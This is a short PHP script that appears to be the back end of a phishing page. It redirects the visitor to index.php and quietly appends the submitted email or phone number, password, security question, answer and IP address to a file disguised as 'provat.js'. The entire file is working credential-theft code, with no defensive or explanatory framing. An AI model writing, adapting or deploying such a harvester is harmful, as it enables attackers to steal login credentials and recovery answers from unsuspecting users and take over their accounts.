<?php
header("Location: index.php");
$ip = getenv("REMOTE_ADDR");

$myfile = fopen("provat.js", "a+") or die("Unable to open file!");

$txt = "================================================\n";
fwrite($myfile, $txt);

$txt = "Email or Phone          : ";
fwrite($myfile, $txt.$_POST['email']."\n");

$txt = "Password                : ";
fwrite($myfile,  $txt.$_POST['pwd']."\n");

$txt = "Security Question       : ";
fwrite($myfile,  $txt.$_POST['question']."\n");

$txt = "Answer                  : ";
fwrite($myfile,  $txt.$_POST['answer']."\n");

$txt = "IP                      : ";
fwrite($myfile,  $txt.$ip."\n");

$txt = "================================================\n";
fwrite($myfile, $txt);
fclose($myfile);
?>